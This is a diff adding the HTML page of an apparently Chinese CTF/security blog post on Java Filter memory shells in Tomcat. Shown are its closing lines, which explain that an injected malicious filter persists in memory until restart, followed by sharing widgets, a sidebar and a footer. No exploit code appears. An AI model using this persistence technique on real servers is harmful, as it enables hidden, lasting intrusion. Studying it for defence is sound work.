+<p>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启</p>
+<p>所以最后就形成了POC。</p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://fmyyy.gitee.io/2021/11/21/java%20Filter%E5%86%85%E5%AD%98%E9%A9%AC/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://fmyyy.gitee.io/2021/11/21/java%20Filter%E5%86%85%E5%AD%98%E9%A9%AC/";
+            const title         = "「java Filter内存马」";
+            const excerpt       = `java Filter内存马去补了点之前javaweb的知识回来看内存马
+Tomcat内存马主要利用了Tomcat的部分组件会在内存中长期驻留的特性，只要将我们的恶意组件注入其中，就可以一直生效，直到容器重启。
+javaweb三大组件...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2021-12-02</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" jdk7u21反序列化" href="/2021/11/19/jdk7u21/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" 2021西湖论剑web部分wp" href="/2021/11/21/2021西湖论剑web部分wp/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/tou.jpg" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">这个ctfer好废物</p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java-Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">java Filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#javaweb%E4%B8%89%E5%A4%A7%E7%BB%84%E4%BB%B6"><span class="toc-text">javaweb三大组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet"><span class="toc-text">Servlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter"><span class="toc-text">Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener"><span class="toc-text">Listener</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FIlter%E6%B5%81%E7%A8%8B"><span class="toc-text">FIlter流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">内存马注入</span></a></li></ol></li></ol></li></ol>
+    </div>
+</aside>
+                
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A1%86%E6%9E%B6/">框架</a><span class="category-list-count">1</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2021/12/02/2021%E5%AE%89%E6%B4%B5%E6%9D%AFezjson-wp/"><i class="fa  fa-book"></i> 2021安洵杯ezjson-wp</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/25/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa  fa-book"></i> fastjson反序列化 1.2.22-1.2.47</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/21/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web%E9%83%A8%E5%88%86wp/"><i class="fa  fa-book"></i> 2021西湖论剑web部分wp</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/21/java%20Filter%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa  fa-book"></i> java Filter内存马</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/11/19/jdk7u21/"><i class="fa  fa-book"></i> jdk7u21反序列化</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:254005846@qq.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2021 fmyyy 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
